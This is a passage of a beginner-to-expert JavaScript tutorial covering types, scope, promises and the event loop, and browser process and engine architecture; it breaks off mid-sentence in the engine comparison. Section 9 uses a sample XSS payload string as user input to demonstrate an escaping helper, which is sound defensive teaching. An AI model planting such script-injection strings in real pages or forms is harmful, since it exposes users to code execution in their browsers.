# JavaScript — The Complete Field Guide (Beginner → Expert)

> 📖 **Read this on [frontendlabs.xyz](https://frontendlabs.xyz/javascript/)**: the official edition, with one page per chapter, search, and dark mode. <!-- frontendlabs-notice -->

> A practical, example-driven path through JavaScript: the language itself,
> the browser it usually runs in, the network it talks over, and the
> multi-threaded, encrypted, offline-capable applications you can build once
> you understand all three.
>
> Every concept is paired with runnable code, a "Real-world example" or "War
> story," and — at the end of each Part — a mini-project you can build today.
> Read it once top to bottom; keep it as a lookup guide.

---

## How to use this guide

- **Beginner (Part I):** values, types, scope, functions, objects, prototypes,
  arrays, strings, errors. Ends with a CLI mini-project.
- **Intermediate (Part II):** the event loop, callbacks, Promises,
  async/await, timers, modules. Ends with an async task queue.
- **Browser internals (Part III):** the browser's multi-process architecture,
  how Blink/Gecko/WebKit actually differ, the DOM/CSSOM, and the critical
  rendering path from bytes to pixels.
- **Networking (Part IV):** HTTP fundamentals, HTTP/1.1 vs 2 vs 3 in the
  browser, `fetch`, CORS, caching, WebSockets.
- **Rendering applications (Part V):** CSR/SSR/SSG, virtual DOM vs
  fine-grained reactivity, hydration, Core Web Vitals.
- **Advanced: concurrency (Part VI):** Web Workers, `SharedArrayBuffer` +
  `Atomics`, Shared/Service Workers, real multi-threaded browser
  architectures.
- **Client-side storage & security (Part VII):** cookies, `localStorage`,
  `sessionStorage`, IndexedDB, and the Web Crypto API — including exactly
  what client-side encryption can and can't protect against.
- **Expert (Part VIII):** what's actually happening inside V8 — parsing,
  bytecode, the JIT, garbage collection, and browser sandboxing.
- **Capstone (Part IX):** an offline-first, multi-threaded, end-to-end
  encrypted note-taking app that uses nearly everything in this guide.

Conventions:
- Code targets evergreen browsers and modern Node.js (ES2022+). Version-gated
  features (e.g. `Array.prototype.group`, cross-origin isolation
  requirements) are called out explicitly.
- "**Real-world example**" boxes ground a concept in something you'll
  actually build. "**War story**" boxes describe a real incident or
  trade-off engineers have hit in production.
- This guide is JS/browser-specific. For the network layer underneath
  `fetch`/HTTP, see [`wiki/networking/tcp-ip/real-life-example.md`](../networking/tcp-ip/real-life-example.html);
  for the load-testing/perf-measurement side of the APIs you'll build here,
  see [`wiki/scale-perf/real-life-scale-guide.md`](../scale-perf/real-life-scale-guide.html).

---

## Table of contents

**Part I — Foundations: the JS way**
1. What JavaScript is, and the engines that run it
2. Running JS: console, Node, and your first script
3. Values and types: primitives, coercion, `==` vs `===`
4. Variables and scope: `var`/`let`/`const`, hoisting, the TDZ
5. Operators and control flow
6. Functions in depth: closures, `this`, `call`/`apply`/`bind`
7. Objects and prototypes: the prototype chain, classes as sugar
8. Arrays and iteration: methods, iterators, generators
9. Strings, template literals, and regular expressions
10. Error handling: `try`/`catch`, custom `Error` subclasses
11. Mini project: a CLI todo app (Node)

**Part II — Intermediate: async JavaScript and the event loop**
12. The call stack, heap, and the event loop model
13. Callbacks and Promises: what actually happens under the hood
14. `async`/`await`: sugar over promises, and its sharp edges
15. Timers and scheduling: `setTimeout`, rAF, `requestIdleCallback`, `MessageChannel`
16. Modules: CommonJS vs ES Modules, bundlers, dynamic `import()`
17. Mini project: an async task queue with concurrency limits and retry

**Part III — Inside the browser**
18. The browser's process model: multi-process architecture and site isolation
19. Browser engines compared: Blink/V8, Gecko/SpiderMonkey, WebKit/JavaScriptCore
20. The DOM and BOM: `window`, `document`, node trees, the CSSOM
21. The critical rendering path: bytes → DOM → CSSOM → render tree → layout → paint → composite
22. Compositing and the GPU: layers, rasterization, the 16.6ms frame budget, jank
23. The event model: capturing, bubbling, delegation, passive listeners
24. Mini project: finding and fixing jank with the Performance panel

**Part IV — HTTP, networking, and the browser**
25. HTTP fundamentals for JS developers
26. HTTP/1.1 vs HTTP/2 vs HTTP/3 in the browser
27. `fetch` and `XMLHttpRequest`: requests, streaming, aborting
28. CORS in depth: same-origin policy, preflight, credentials
29. HTTP caching and the browser cache
30. WebSockets and Server-Sent Events
31. Mini project: a resilient fetch client (timeout, retry, cache, dedup)

**Part V — Rendering web applications in depth**
32. Rendering models: CSR, SSR, SSG, ISR
33. Virtual DOM reconciliation vs fine-grained reactivity (signals)
34. Hydration and partial/progressive/resumable hydration
35. Core Web Vitals: LCP, INP, CLS — measuring and fixing them
36. Mini project: a virtual-DOM renderer from scratch (~150 lines)

**Part VI — Advanced JS: concurrency and multi-threaded browser apps**
37. Why JS is (mostly) single-threaded, and what that really means
38. Web Workers: `postMessage`, structured clone, transferable objects
39. `SharedArrayBuffer` and `Atomics`: real shared-memory concurrency
40. Shared Workers and Service Workers: lifecycle, scope, background sync
41. Multi-threaded architecture patterns: worker pools, Comlink-style RPC
42. Mini project: a multi-threaded Mandelbrot renderer (worker pool + SAB)

**Part VII — Client-side storage and encryption**
43. Cookies in depth: attributes, `HttpOnly`/`Secure`/`SameSite`
44. `localStorage` and `sessionStorage`: API, quotas, pitfalls
45. IndexedDB: transactional storage for structured, larger data
46. The Web Crypto API: hashing, AES-GCM, key derivation, asymmetric crypto
47. What client-side encryption can't protect against: the XSS threat model
48. Mini project: an encrypted notes app (Web Crypto + IndexedDB)

**Part VIII — Expert: engine internals and browser security**
49. Inside V8: parsing, Ignition bytecode, TurboFan, hidden classes, inline caches
50. Garbage collection and memory leaks in real JS apps
51. Browser security internals: CSP, sandboxing, Spectre, site isolation

**Part IX — Capstone**
52. Capstone: an offline-first, multi-threaded, end-to-end-encrypted notes PWA

**Appendices**
- A. Event-loop task-ordering cheat sheet
- B. Storage options comparison table
- C. Web Crypto API cheat sheet
- D. Glossary
- E. Further reading

---

# Part I — Foundations: the JS way

## 1. What JavaScript is, and the engines that run it

JavaScript was written by Brendan Eich at Netscape in **10 days in 1995**. It
was rushed to market to make web pages "alive" (validate a form, animate a
menu) and deliberately made to *look* like Java for marketing reasons —
despite the two languages sharing almost nothing beyond syntax. That rushed
origin explains a surprising amount of the language's quirky behavior
(`typeof null === "object"`, automatic semicolon insertion, `==` coercion
rules) that later specs couldn't remove without breaking the web.

**ECMAScript** is the standardized specification JavaScript implements (ECMA
International, TC39 committee). "JavaScript" and "ECMAScript" are used almost
interchangeably; version names you'll see in the wild:

| Name | Year | Notable additions |
|---|---|---|
| ES5 | 2009 | `strict mode`, `Array.prototype.map/filter/reduce`, `JSON` |
| ES6 / ES2015 | 2015 | `let`/`const`, classes, arrow functions, Promises, modules, template literals, destructuring |
| ES2017 | 2017 | `async`/`await` |
| ES2020 | 2020 | optional chaining `?.`, nullish coalescing `??`, `BigInt` |
| ES2022 | 2022 | top-level `await`, class private fields (`#x`) |
| ES2023+ | 2023+ | `Array.prototype.toSorted`/`with`, incremental yearly additions |

TC39 ships one edition per year now; there's no "waiting for ES7" anymore —
proposals move through stages 0→4 and ship independently once they reach
Stage 4.

**Engines** are the programs that actually execute JS. Every browser (and
Node.js, Deno, Bun) embeds one:

| Engine | Ships in | JIT tiers |
|---|---|---|
| **V8** | Chrome, Edge, Opera, Node.js, Deno | Ignition (interpreter) → Sparkplug (baseline JIT) → Maglev → TurboFan (optimizing JIT) |
| **SpiderMonkey** | Firefox | Interpreter → Baseline → Ion (optimizing JIT) |
| **JavaScriptCore (Nitro)** | Safari, all iOS browsers (WebKit is mandated for *all* browsers on iOS by Apple) | LLInt (interpreter) → Baseline → DFG → FTL (optimizing JIT) |

All three converge on roughly the same idea: start executing quickly with a
simple interpreter, watch which functions run hot, and recompile *those* to
optimized machine code — because compiling everything ahead of time would
make page load unacceptably slow, and interpreting everything forever would
make hot loops unacceptably slow. §49 goes deep on V8's specific pipeline.

> **Real-world example.** "Why does my code run fine in Chrome but is subtly
> slower/different in Safari?" — often it's not a bug, it's JavaScriptCore's
> different JIT heuristics and GC pause behavior. Cross-browser testing isn't
> optional if you ship to consumers; §19 covers the concrete engine
> differences that cause this.

## 2. Running JS: console, Node, and your first script

Three environments you'll write JS in, and what's different about each:

- **Browser console/DevTools**: has `window`, `document`, and every Web API
  (`fetch`, `localStorage`, Web Workers) but no filesystem/`require`.
- **Node.js**: has `fs`, `process`, `require`/CommonJS (or ESM with `"type":
  "module"`), but no `window`/`document`/DOM — it's a server-side runtime, not
  a browser.
- **`<script>` tag in an HTML file**: same globals as the console, but runs
  in the page's actual execution context, wired to real DOM elements.

```javascript
// hello.js — run with `node hello.js`
console.log("Hello from Node", process.version);

// index.html — open directly in a browser
// <script>
//   console.log("Hello from the browser", navigator.userAgent);
//   document.body.textContent = "Hello, DOM";
// </script>
```

`"use strict"` (automatic in ES modules and classes) turns silent mistakes
into thrown errors: assigning to an undeclared variable, duplicate parameter
names, and several others. There's no reason to write new non-strict code in
2026 — always target modules or explicit strict mode.

## 3. Values and types: primitives, coercion, `==` vs `===`

JavaScript has exactly **8 types**: 7 primitives (`undefined`, `null`,
`boolean`, `number`, `bigint`, `string`, `symbol`) plus `object` (which
includes arrays, functions, dates, maps, sets — everything non-primitive).

```javascript
typeof undefined   // "undefined"
typeof null        // "object"   <- famous historical bug, kept forever for compatibility
typeof 42          // "number"
typeof 42n         // "bigint"
typeof "hi"        // "string"
typeof true        // "boolean"
typeof Symbol()    // "symbol"
typeof {}          // "object"
typeof []          // "object"   <- arrays are objects; use Array.isArray()
typeof function(){} // "function" (a callable object)
```

`number` is a single IEEE-754 double-precision float type for *everything*
— there's no separate int type, which is why `0.1 + 0.2 === 0.30000000000000004`
and why integers beyond `Number.MAX_SAFE_INTEGER` (2^53 − 1) lose precision.
`BigInt` (`42n`) exists specifically to represent arbitrary-precision integers
when that matters (crypto, large IDs).

**Coercion** is JavaScript converting a value's type implicitly to make an
operation work. `==` (loose equality) coerces; `===` (strict equality) never
does — always use `===` unless you have a specific, commented reason not to.

```javascript
"5" == 5        // true  — string coerced to number
null == undefined  // true — special-cased, both "nullish"
0 == false      // true  — boolean coerced to number
"" == 0         // true  — both coerce to 0
[] == false     // true  — array -> string "" -> number 0

"5" === 5       // false — no coercion, different types
null === undefined // false
```

Memorize the two `==` exceptions worth keeping (`null == undefined` is a
genuinely useful "is this nullish" check) and otherwise ban `==` via
ESLint's `eqeqeq` rule — the coercion table is not something anyone should
rely on from memory in review.

## 4. Variables and scope: `var`/`let`/`const`, hoisting, the TDZ

```javascript
var a = 1;    // function-scoped, hoisted, re-declarable — avoid in new code
let b = 2;    // block-scoped, hoisted into a "temporal dead zone", not re-declarable
const c = 3;  // block-scoped like let, binding cannot be reassigned (contents still mutable)

const arr = [1, 2];
arr.push(3);   // fine — the array's contents mutate
arr = [];      // TypeError — the binding `arr` is const
```

**Hoisting**: declarations are processed before code runs, but `var` and
`let`/`const` behave differently:

```javascript
console.log(x);  // undefined (not an error) — var is hoisted AND initialized to undefined
var x = 5;

console.log(y);  // ReferenceError: Cannot access 'y' before initialization
let y = 5;        // let/const are hoisted but NOT initialized — this gap is the
                   // "Temporal Dead Zone" (TDZ), and it's a deliberate safety net
```

The classic `var`-in-a-loop closure bug, and why `let` fixed it:

```javascript
// var: all three callbacks share ONE function-scoped `i`, which is 3 by the time they run
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 0);   // logs 3, 3, 3
}

// let: each iteration gets its OWN block-scoped binding of `i`
for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 0);   // logs 0, 1, 2
}
```

**Closures**: a function "closes over" the variables in its surrounding
scope, keeping them alive even after that scope has returned — this is the
mechanism behind the `let` example above, and behind every module pattern,
memoizer, and event handler that references outer state.

```javascript
function makeCounter() {
  let count = 0;               // captured by the closure below
  return function increment() {
    count += 1;
    return count;
  };
}
const counter = makeCounter();
counter(); // 1
counter(); // 2 — `count` persisted between calls, private to this closure
```

## 5. Operators and control flow

Beyond the arithmetic/comparison basics, three operators pull real weight in
modern code:

```javascript
const user = null;
user?.profile?.name;        // optional chaining: undefined instead of throwing
const name = user?.name ?? "Anonymous";  // nullish coalescing: only falls back on null/undefined

// vs the older, buggier `||` fallback:
const count = 0;
count || 10;   // 10 — WRONG if 0 is a valid value, `||` treats it as falsy
count ?? 10;   // 0  — CORRECT, ?? only falls back on null/undefined
```

`switch` uses `===` semantics and needs explicit `break` (fallthrough is
intentional and common for grouping cases); prefer object-literal lookup
tables or a `Map` over long `if/else if` chains for pure value dispatch.

## 6. Functions in depth: closures, `this`, `call`/`apply`/`bind`

Four ways to write a function, with real behavioral differences:

```javascript
function declared() {}                  // hoisted fully — usable before its definition
const expr = function() {};             // hoisted as `undefined`, only usable after assignment
const arrow = () => {};                 // no own `this`, `arguments`, or `prototype`
class C { method() {} }                 // method shorthand, not enumerable, strict mode always
```

**`this`** is the single most common source of JS confusion. It is NOT
lexically scoped for regular functions — it's determined by *how the
function is called*, not where it's defined:

```javascript
const obj = {
  name: "obj",
  regular: function () { return this.name; },
  arrow: () => { return this?.name; },   // `this` here is captured from the ENCLOSING scope
};

obj.regular();          // "obj" — called as obj.regular(), so `this` = obj
const fn = obj.regular;
fn();                   // undefined (or throws in strict mode) — called bare, `this` is undefined
obj.arrow();            // undefined — arrow functions never bind their own `this`
```

`call`/`apply`/`bind` explicitly control `this`:

```javascript
function greet(greeting) { return `${greeting}, ${this.name}`; }
const person = { name: "Ada" };

greet.call(person, "Hi");     // "Hi, Ada" — invoke immediately, args listed individually
greet.apply(person, ["Hi"]);  // "Hi, Ada" — invoke immediately, args as an array
const bound = greet.bind(person);
bound("Hi");                   // "Hi, Ada" — returns a NEW function permanently bound to `person`
```

> **Real-world example.** React class components historically needed
> `this.handleClick = this.handleClick.bind(this)` in the constructor for
> exactly this reason — passing `this.handleClick` as a callback strips it
> from `this.` Hooks and arrow-function class fields made this mostly
> historical, but the underlying `this`-binding rule hasn't changed.

## 7. Objects and prototypes: the prototype chain, classes as sugar

Every JS object has an internal link to another object — its **prototype** —
forming a chain that property lookups walk up until found or the chain ends
at `null`.

```javascript
const animal = { eats: true };
const rabbit = Object.create(animal);   // rabbit's prototype is `animal`
rabbit.hops = true;

rabbit.eats;   // true — not own property, found via the prototype chain
rabbit.hops;   // true — own property

Object.getPrototypeOf(rabbit) === animal;  // true
```

**`class` is syntax sugar over exactly this mechanism** — no new object
model, just a cleaner syntax for prototype-based inheritance plus real
private fields:

```javascript
class Animal {
  #internalId;                          // truly private — inaccessible outside the class
  constructor(name) { this.name = name; this.#internalId = crypto.randomUUID(); }
  speak() { return `${this.name} makes a sound.`; }
}
class Dog extends Animal {
  speak() { return `${super.speak()} Specifically, a bark.`; }
}
new Dog("Rex").speak();
// "Rex makes a sound. Specifically, a bark."

// Under the hood this is equivalent to:
// Dog.prototype = Object.create(Animal.prototype);
// Dog.prototype.speak calls Animal.prototype.speak via `super`
```

## 8. Arrays and iteration: methods, iterators, generators

Arrays are objects with numeric keys and a `length` that auto-updates. The
functional methods (`map`/`filter`/`reduce`) don't mutate; a handful of
older methods (`push`, `splice`, `sort`, `reverse`) do — know which is which,
since mutating a shared array is a classic bug source in UI state.

```javascript
const nums = [1, 2, 3, 4, 5];
nums.map(n => n * 2);              // [2,4,6,8,10] — new array
nums.filter(n => n % 2 === 0);     // [2,4]        — new array
nums.reduce((sum, n) => sum + n, 0); // 15          — folds to one value
nums.sort((a, b) => b - a);        // MUTATES nums in place, now [5,4,3,2,1]
```

The **iterator protocol** is what makes `for...of`, spread (`...`), and
destructuring work on arrays, `Map`, `Set`, strings, and any custom object
that implements `Symbol.iterator`:

```javascript
class Range {
  constructor(start, end) { this.start = start; this.end = end; }
  [Symbol.iterator]() {
    let current = this.start, end = this.end;
    return {
      next() {
        return current <= end
          ? { value: current++, done: false }
          : { value: undefined, done: true };
      },
    };
  }
}
[...new Range(1, 5)];        // [1,2,3,4,5] — works because Range implements the protocol
for (const n of new Range(1, 3)) console.log(n); // 1, 2, 3
```

**Generators** (`function*`) are a shortcut for writing iterators without
hand-rolling `next()`:

```javascript
function* range(start, end) {
  for (let i = start; i <= end; i++) yield i;
}
[...range(1, 5)];   // [1,2,3,4,5]
```

Generators also underpin how async iteration and (historically) some
coroutine-style async patterns work — `yield` pauses execution and hands a
value out, exactly like `await` pauses on a promise (§14).

## 9. Strings, template literals, and regular expressions

Strings are immutable UTF-16 sequences — every "mutating" string method
returns a new string. Template literals (`` `...` ``) support interpolation
and multi-line strings natively, and **tagged templates** let a function
intercept and transform the literal before it's assembled — the mechanism
behind libraries like `styled-components` and safe SQL-templating helpers:

```javascript
function safeHtml(strings, ...values) {
  const escape = (s) => String(s).replace(/[&<>"']/g, c => ({
    "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;",
  }[c]));
  return strings.reduce((out, str, i) =>
    out + str + (i < values.length ? escape(values[i]) : ""), "");
}
const userInput = "<script>alert(1)</script>";
safeHtml`<p>Hello, ${userInput}</p>`;
// "<p>Hello, &lt;script&gt;alert(1)&lt;/script&gt;</p>" — escaped automatically
```

Regular expressions (`/pattern/flags`) are used via `.test()`, `.match()`,
`.matchAll()`, and `String.prototype.replace`. Named capture groups make
extraction readable:

```javascript
const re = /(?<year>\d{4})-(?<month>\d{2})-(?<day>\d{2})/;
const m = "2026-09-13".match(re);
m.groups.year;   // "2026"
```

## 10. Error handling: `try`/`catch`, custom `Error` subclasses

```javascript
class ValidationError extends Error {
  constructor(message, field) {
    super(message);
    this.name = "ValidationError";
    this.field = field;
  }
}

function validateAge(age) {
  if (age < 0) throw new ValidationError("Age cannot be negative", "age");
  return age;
}

try {
  validateAge(-5);
} catch (err) {
  if (err instanceof ValidationError) {
    console.error(`Invalid ${err.field}: ${err.message}`);
  } else {
    throw err;   // re-throw anything you didn't expect — never swallow silently
  }
} finally {
  console.log("validation attempted");   // always runs, even after a return/throw
}
```

Never write an empty `catch {}` — it hides real bugs. If you genuinely don't
care about an error, catch it and log it, so a silent failure is at least
discoverable in production logs.

## 11. Mini project: a CLI todo app (Node)

```javascript
// todo.js — node todo.js add "Buy milk" | node todo.js list | node todo.js done 0
import { readFileSync, writeFileSync, existsSync } from "node:fs";

const DB_PATH = "./todos.json";

function loadTodos() {
  return existsSync(DB_PATH) ? JSON.parse(readFileSync(DB_PATH, "utf8")) : [];
}
function saveTodos(todos) {
  writeFileSync(DB_PATH, JSON.stringify(todos, null, 2));
}

const [, , command, ...args] = process.argv;
const todos = loadTodos();

switch (command) {
  case "add":
    todos.push({ text: args.join(" "), done: false });
    saveTodos(todos);
    console.log(`Added: "${args.join(" ")}"`);
    break;
  case "list":
    todos.forEach((t, i) => console.log(`${i}: [${t.done ? "x" : " "}] ${t.text}`));
    break;
  case "done":
    const idx = Number(args[0]);
    if (todos[idx]) { todos[idx].done = true; saveTodos(todos); console.log("Marked done."); }
    break;
  default:
    console.log("Usage: todo.js <add|list|done> [args]");
}
```

This exercises closures-free module state (a file as the "database"),
array methods, template literals, and basic error-free control flow — the
full Part I toolkit.

---

# Part II — Intermediate: async JavaScript and the event loop

## 12. The call stack, heap, and the event loop model

JavaScript engines run on **one call stack per realm** (§37 explains what
"realm" means precisely). Long-running synchronous code blocks that single
stack completely — nothing else, including UI rendering, can happen until it
unwinds. Understanding *why* async APIs exist, and *how* they resume, is the
single highest-leverage piece of JS knowledge for building responsive apps.

```
   Call Stack                 Web APIs / Node APIs         Callback Queues
  ┌───────────┐             ┌──────────────────────┐     ┌─────────────────┐
  │  main()   │──setTimeout─▶│ timer (browser/libuv) │     │  Macrotask queue │
  │  fetch()  │──fetch──────▶│ network stack         │────▶│  (setTimeout,    │
  └───────────┘             └──────────────────────┘     │   I/O, UI events)│
        ▲                                                  └─────────────────┘
        │                                                           │
        │              Event Loop: "is the stack empty?"            │
        │              if yes: drain ALL microtasks first,          │
        └──────────────pop one task, push it onto the stack─────────┘
                              ┌─────────────────┐
                              │ Microtask queue  │  (Promise .then/.catch,
                              │                  │   queueMicrotask, async/await
                              └─────────────────┘   resumption)
```

The critical ordering rule, tested in every JS interview and hit in every
real async bug: **after each single task, the engine fully drains the
microtask queue before running the next task (or the next paint).**

```javascript
console.log("1: sync");

setTimeout(() => console.log("2: macrotask (setTimeout)"), 0);

Promise.resolve().then(() => console.log("3: microtask (promise)"));

queueMicrotask(() => console.log("4: microtask (queueMicrotask)"));

console.log("5: sync");

// Output order: 1, 5, 3, 4, 2
// Both synchronous logs run first (the stack never yields mid-script).
// Then ALL queued microtasks drain (3 then 4, in queue order) —
// THEN, only once the microtask queue is empty, the engine picks up
// the next macrotask (2).
```

This is why a microtask that queues another microtask can, in principle,
starve the event loop from ever reaching a macrotask (a real, documented
performance bug class — an infinite chain of `Promise.resolve().then(...)`
will hang a page just as thoroughly as a synchronous `while(true)`).

## 13. Callbacks and Promises: what actually happens under the hood

Before Promises, async results were delivered via callbacks — functions
passed in and invoked later. Nesting them for sequential async steps
produces "callback hell":

```javascript
getUser(id, (err, user) => {
  if (err) return handleError(err);
  getPosts(user.id, (err, posts) => {
    if (err) return handleError(err);
    getComments(posts[0].id, (err, comments) => {
      if (err) return handleError(err);
      render(user, posts, comments);   // 3 levels deep, error handling repeated 3x
    });
  });
});
```

A **Promise** is a state machine with exactly three states — `pending` →
`fulfilled` or `pending` → `rejected` — and once settled, it never changes
again. `.then()` doesn't run the callback synchronously even if the promise
is already resolved; it always schedules it as a microtask, which is what
guarantees consistent ordering.

```javascript
function delay(ms, value) {
  return new Promise((resolve) => setTimeout(() => resolve(value), ms));
}

delay(100, "done")
  .then((value) => { console.log(value); return value.toUpperCase(); })
  .then((upper) => console.log(upper))
  .catch((err) => console.error("caught:", err));   // catches a rejection at ANY step above
```

Promise combinators for concurrent work:

```javascript
Promise.all([p1, p2, p3]);        // resolves when ALL resolve; rejects fast on the FIRST rejection
Promise.allSettled([p1, p2, p3]); // always resolves, with { status, value|reason } for each
Promise.race([p1, p2, p3]);       // settles as soon as the FIRST one settles (resolve or reject)
Promise.any([p1, p2, p3]);        // resolves on the FIRST fulfillment; rejects only if ALL reject
```

> **War story.** A team used `Promise.all` to fetch 5 independent dashboard
> widgets' data. One flaky endpoint failing 2% of the time took down the
> *entire* dashboard on every request, because `Promise.all` rejects as soon
> as any one promise rejects — the other 4 successful results were thrown
> away. Switching to `Promise.allSettled` and rendering each widget
> independently based on its own settled result fixed it in one line.

## 14. `async`/`await`: sugar over promises, and its sharp edges

`async`/`await` doesn't change the underlying microtask machinery — it's
syntax that makes promise chains read like synchronous code. An `async`
function always returns a Promise; `await` pauses the function (not the
whole program) until the awaited promise settles.

```javascript
async function loadDashboard(userId) {
  try {
    const user = await getUser(userId);       // pauses here, yields to the event loop
    const posts = await getPosts(user.id);    // then here
    return { user, posts };
  } catch (err) {
    // catches rejections from EITHER await above — same benefit as .catch()
    throw new Error(`Dashboard load failed: ${err.message}`);
  }
}
```

The sharp edge: sequential `await`s that don't depend on each other
serialize work that could run concurrently.

```javascript
// SLOW: each await blocks the next from even starting — total time = sum of both
const user = await getUser(id);
const settings = await getSettings(id);   // doesn't need `user` — but waits anyway

// FAST: start both requests immediately, await their results together
const [user, settings] = await Promise.all([getUser(id), getSettings(id)]);
```

## 15. Timers and scheduling: `setTimeout`, rAF, `requestIdleCallback`, `MessageChannel`

Not all "run this later" APIs are equal — each is a different macrotask
source tuned for a different purpose:

| API | Fires | Use for |
|---|---|---|
| `setTimeout(fn, 0)` | Next macrotask turn, but browsers clamp nested timeouts to a **minimum ~4ms** after 5 levels of nesting | General deferred work |
| `requestAnimationFrame(fn)` | Right before the next repaint, synced to the display's refresh rate (~60Hz = 16.6ms) | Any visual animation — never animate with `setInterval` |
| `requestIdleCallback(fn)` | During browser idle periods, with a deadline you must respect | Low-priority background work (analytics batching, prefetch) that shouldn't compete with rendering |
| `queueMicrotask(fn)` | End of the current task, before the next macrotask/paint (§12) | Deferring work to just after the current synchronous block, without a full event-loop turn |
| `MessageChannel` | Macrotask, but with **no minimum delay clamp** unlike `setTimeout(fn, 0)` | The fastest legal way to yield to the event loop — used internally by React's scheduler |

```javascript
function animate() {
  element.style.transform = `translateX(${x++}px)`;
  if (x < 300) requestAnimationFrame(animate);   // self-scheduling, paced to the display
}
requestAnimationFrame(animate);
```

## 16. Modules: CommonJS vs ES Modules, bundlers, dynamic `import()`

Two module systems coexist in the JS ecosystem:

```javascript
// CommonJS (Node's original system, synchronous, still everywhere in npm packages)
const fs = require("node:fs");
module.exports = { readConfig };

// ES Modules (the language standard, async-capable, works natively in browsers)
import fs from "node:fs";
export function readConfig() { /* ... */ }
export default class Config { /* ... */ }
```

Key differences: ESM is **statically analyzable** (imports/exports are
determined before execution, enabling tree-shaking — bundlers can delete
unused exports), is always strict mode, and has live bindings (an imported
value updates if the exporting module changes it, unlike CommonJS's
snapshot-at-require-time copy).

**Dynamic `import()`** returns a Promise and is the standard way to code-split
— load a module only when it's actually needed:

```javascript
button.addEventListener("click", async () => {
  const { openEditor } = await import("./editor.js");   // fetched only on first click
  openEditor();
});
```

**Bundlers** (Webpack, esbuild, Vite/Rollup) exist because: browsers didn't
support ESM until ~2018 (Webpack predates browser ESM), `node_modules` has
thousands of small files that are faster to serve as fewer bundles, and
bundlers do tree-shaking, minification, and transform newer syntax down for
older targets.

## 17. Mini project: an async task queue with concurrency limits and retry

```javascript
class TaskQueue {
  #concurrency; #running = 0; #queue = [];
  constructor(concurrency = 3) { this.#concurrency = concurrency; }

  add(taskFn, { retries = 2 } = {}) {
    return new Promise((resolve, reject) => {
      this.#queue.push({ taskFn, retries, resolve, reject });
      this.#next();
    });
  }

  async #next() {
    if (this.#running >= this.#concurrency || this.#queue.length === 0) return;
    this.#running++;
    const item = this.#queue.shift();
    try {
      resolve_result: {
        try {
          const result = await item.taskFn();
          item.resolve(result);
          break resolve_result;
        } catch (err) {
          if (item.retries > 0) {
            this.#queue.push({ ...item, retries: item.retries - 1 });
          } else {
            item.reject(err);
          }
        }
      }
    } finally {
      this.#running--;
      this.#next();   // pull the next queued item, whether we just succeeded or freed a slot
    }
  }
}

const queue = new TaskQueue(2);   // only 2 fetches in flight at once
const urls = ["/api/a", "/api/b", "/api/c", "/api/d", "/api/e"];
const results = await Promise.all(
  urls.map((url) => queue.add(() => fetch(url).then((r) => r.json())))
);
```

This is the exact shape of pattern real apps use to avoid saturating a
browser's per-origin connection limit (historically 6 for HTTP/1.1, see §26)
when firing many requests at once.

---

# Part III — Inside the browser

## 18. The browser's process model: multi-process architecture and site isolation

A modern browser is not one program — it's several cooperating **processes**,
because a single-process browser means one crashed tab (or one exploited
renderer bug) takes down everything, including your banking tab open in
another window.

```
┌─────────────────────────────────────────────────────────────┐
│ Browser Process (1, privileged: disk, network sockets, UI)   │
│  - owns the address bar, bookmarks, extensions installation  │
│  - the ONLY process allowed to touch the filesystem directly │
└───────────────┬───────────────────────────────────────────────┘
                │ IPC (Chrome: Mojo; Firefox: IPDL)
    ┌───────────┼──────────────┬─────────────────┬───────────────┐
    ▼           ▼              ▼                 ▼               ▼
┌────────┐ ┌────────┐    ┌──────────┐      ┌───────────┐  ┌────────────┐
│Renderer│ │Renderer│ ... │GPU process│      │Network    │  │Utility procs│
│(tab A) │ │(tab B) │    │(compositing,      │process    │  │(audio, etc.)│
│sandboxed│ │sandboxed│   │ rasterization)   │(fetches,   │  └────────────┘
│no disk/ │ │no disk/ │   └──────────┘      │ DNS, TLS) │
│network  │ │network  │                     └───────────┘
└────────┘ └────────┘
```

Each **renderer process** runs a heavily sandboxed copy of the engine (Blink,
Gecko, or WebKit) and is *deliberately* denied direct filesystem/network
access — it must ask the privileged browser process via IPC for everything.
This is the concrete mechanism that limits the blast radius of a compromised
renderer (e.g., an exploited PDF parser or a malicious ad) from becoming a
full system compromise.

**Site isolation** (shipped in Chrome since 2018, largely in response to
Spectre) puts each **origin** — not just each tab — in its own renderer
process by default. This is why opening dev tools and inspecting the
"Frames" tree of a page with cross-origin iframes shows genuinely separate
processes: a malicious iframe's renderer process physically cannot read
memory belonging to the parent page's renderer process, closing off an
entire class of speculative-execution side-channel attacks (§51).

> **Real-world example.** Task Manager (Chrome: `Shift+Esc`) literally shows
> you this architecture — one row per renderer process (often one per tab,
> sometimes more for cross-origin iframes), one row for the GPU process, one
> for the network service. A tab using 400MB isn't "the browser" using
> 400MB — it's that specific renderer process's V8 heap + DOM + layout data.

## 19. Browser engines compared: Blink/V8, Gecko/SpiderMonkey, WebKit/JavaScriptCore

An "engine" bundles a **rendering engine** (HTML/CSS parsing, layout, paint)
and a **JS engine**. The three lineages in active use:

| | Rendering engine | JS engine | Ships in |
|---|---|---|---|
| **Chromium family** | Blink (forked from WebKit in 2013) | V8 | Chrome, Edge, Brave, Opera, Samsung Internet, Arc |
| **Firefox** | Gecko | SpiderMonkey | Firefox only |
| **Safari / all iOS browsers** | WebKit | JavaScriptCore | Safari, and — by Apple App Store policy until the EU's DMA forced an exception — every "Chrome" or "Firefox" on iOS, which are actually WebKit wrappers |

Concrete engineering differences that surface as real bugs:

- **CSS feature timing**: Blink ships experimental CSS behind flags fastest
  (largest market share, fastest iteration); Safari has historically lagged
  on features like `:has()`, container queries, and specific `backdrop-filter`
  behaviors — "works in Chrome" bug reports are overwhelmingly a WebKit gap.
- **Layout algorithm quirks**: subpixel rounding, flexbox gap interpretation
  in older versions, and `position: sticky` inside `overflow` containers have
  all had genuinely different (spec-ambiguous) behavior across engines.
- **JS engine GC pause characteristics**: V8's generational GC (§50) and
  JavaScriptCore's differ enough that the *same* allocation-heavy code can
  show different jank patterns per browser — a page smooth in Chrome can
  stutter in Safari purely from GC timing, not a logic bug.
- **Memory/process limits**: mobile Safari (WebKit) has historically imposed
  much tighter per-tab memory ceilings than desktop Chrome, causing tab
  reloads on data-heavy SPAs that never reproduce on a developer's desktop
  Chrome.

**Why this matters for testing**: automated cross-browser testing (Playwright
driving real Chromium, Firefox, *and* WebKit builds — not just "Chrome
headless") is the only way to catch these; unit tests running in jsdom (which
